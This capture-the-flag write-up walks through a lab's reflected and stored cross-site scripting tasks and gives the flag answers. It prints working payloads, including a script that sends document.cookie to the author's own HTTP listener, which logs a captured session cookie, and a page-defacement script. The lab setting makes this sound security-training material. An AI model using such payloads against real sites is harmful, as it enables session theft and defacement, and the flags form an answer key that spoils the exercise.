# 06. Cross-site Scripting

- Target: http://10.10.68.121

1) Navigate to http://10.10.68.121/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

- The source code

```
  <details>
        <summary>Why does this work?</summary></br>
        <p>When you submit anything in the search input, it will appear in the <b>keyword</b> query in your URL.</p>
        <p>Remember, the main difference between reflected and dom based xss, is that with reflected xss your
        payload (string in this case) gets inputted directly into the page. No Javascript is loaded before hand,
        neither is anything processed in the DOM before hand.</p>
        <p>Look at the source code, you will notice your payload is executed directly on the webpage.</p>
        <kbd>&lt;h6>You searched for: **[Your input will be input directly in here]**&lt;/h6></kbd>
        <p>This means any user input that is **not sanatised will be executed.**</p>
      </details>
```

⇒ The user input is not sanitized at all 

- The payload: `<script>alert("Hello");</script>`

**Result:** ThereIsMoreToXSSThanYouThink

2) On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

- According to hint in tryhackme, window.location.hostname will show your hostname, in this case your deployed machine's hostname will be its IP.
- The payload: <script>alert(window.location.host);</script>

Result: ReflectiveXss4TheWin

[Before changing to stored XSS]

- There is a technique simulating how to get cookie of other user so that if user clicks the link we send, our server will get the request that contains cookie of user
- Host the http server for ourselves by the command:  python3 -m http.server 8888
- The payload to send request with cookie: <script>var payload = 'http://10.17.24.66:8888/'+document.cookie; fetch(payload);</script>
- The result when we receive the request:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.17.24.66 - - [26/Feb/2024 08:58:58] code 404, message File not found
10.17.24.66 - - [26/Feb/2024 08:58:58] "GET /connect.sid=s%3AmyRul5pqABes83AFJlVUlGKmpbmCqA9-.9RMSMVFMRrarPMFdI0iwarMpxAdNsMmdx994kULs39g HTTP/1.1" 404 -
```

3) Then add a comment and see if you can insert some of your own HTML.

- Insert any html tag in the output bc the code is not sanitized at all: `<h1>Fuck </h1>` ⇒ create a tag successfully
- Here is the js code:

```
  let commentsEl = document.querySelector('#comments')
  if(commentsEl) {
    $.getJSON('/get-comments', function(comments) {
      commentsEl.innerHTML = ''
      for(let comment of comments) {
        // convertComment(comment.comment)
        fixJS(comment.comment)
        commentsEl.innerHTML += '<code>' + comment.username + '</code>: ' + comment.comment + '</br>'
      }
```

**Result:** Successfully added a HTML comment! Answer for Q1: HTML_T4gs

4) On the same page, create an alert popup box appear on the page with your document cookies.

- The payload to alert cookie: <script>alert(document.cookie)</script>

**Result:** W3LL_D0N3_LVL2

5) Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

- Firstly, we find ‘XSS playground’ in the source code, so we can see id 'thm-title'

```
img src="/img/smallLogo.png" height="30" class="d-inline-block align-top" alt="" style="margin-right: .5em;"> <span id='thm-title'>XSS Playground</span>
```

- Now we know that XSS playground has the id thm-title. Next, we will find the js code with #thm-title

```
function checkTitle() {
//[*] If the text content of the element with the ID 'thm-title' is "I am a hacker"
    if(document.querySelector('#thm-title').textContent == "I am a hacker") {
      $.getJSON('/get-answer-title-change', function(answer) {
// Display the fetched answer in an element with the ID 'stored-xss'
        document.querySelector('#stored-xss').innerHTML += 'Answer: <code>' + answer + '</code>'
      })
    }
  }

```

- The payload: <script>document.querySelector("#thm-title").textContent = "I am a hacker"</script>
- It will display the answer here

```
    <li>Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript. <span id="stored-xss"></span></li>
```

**Result:**  websites_can_be_easily_defaced_with_xss
